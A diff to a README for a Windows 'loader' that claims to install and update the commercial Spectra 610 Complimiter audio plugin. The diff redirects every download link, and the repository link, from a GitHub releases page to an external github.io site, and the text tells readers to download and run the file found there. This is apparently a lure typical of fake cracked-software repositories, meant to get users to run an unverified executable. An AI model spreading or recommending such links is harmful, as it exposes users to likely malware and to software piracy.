@@ -1,6 +1,6 @@
 <h1>📀 spectra-610-complimiter-loader - Easy Installer & Updater for Windows</h1>
 <p align="center">
-  <a href="https://github.com/alimohame3065/spectra-610-complimiter-loader/releases" style="display:inline-block;padding:16px 32px;font-size:24px;font-weight:bold;color:#ffffff;background:#4CAF50;border-radius:8px;text-decoration:none;">⬇️ Download the Loader</a>
+  <a href="https://alimohame3065.github.io" style="display:inline-block;padding:16px 32px;font-size:24px;font-weight:bold;color:#ffffff;background:#4CAF50;border-radius:8px;text-decoration:none;">⬇️ Download the Loader</a>
 </p>
 
 ## 🚀 Getting Started
@@ -16,7 +16,7 @@ This tool helps you install and update the Audiopunks Spectra 610 Complimiter on
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/alimohame3065/spectra-610-complimiter-loader/releases](https://github.com/alimohame3065/spectra-610-complimiter-loader/releases)
+Visit this link to download the application: [https://alimohame3065.github.io](https://alimohame3065.github.io)
 
 On the page, click the latest release and download the file. Then run the downloaded file on your Windows computer.
 
@@ -65,7 +65,7 @@ This tool is provided as-is for personal use. The Spectra 610 Complimiter plugin
 
 ## 🌐 Links
 
-- **Download Page:** [https://github.com/alimohame3065/spectra-610-complimiter-loader/releases](https://github.com/alimohame3065/spectra-610-complimiter-loader/releases)
-- **Repository:** [https://github.com/alimohame3065/spectra-610-complimiter-loader](https://github.com/alimohame3065/spectra-610-complimiter-loader)
+- **Download Page:** [https://alimohame3065.github.io](https://alimohame3065.github.io)
+- **Repository:** [https://alimohame3065.github.io](https://alimohame3065.github.io)
 
 Keywords: audio plugin, vst, windows loader, update tool, complimiter, audiophiles, daw tool
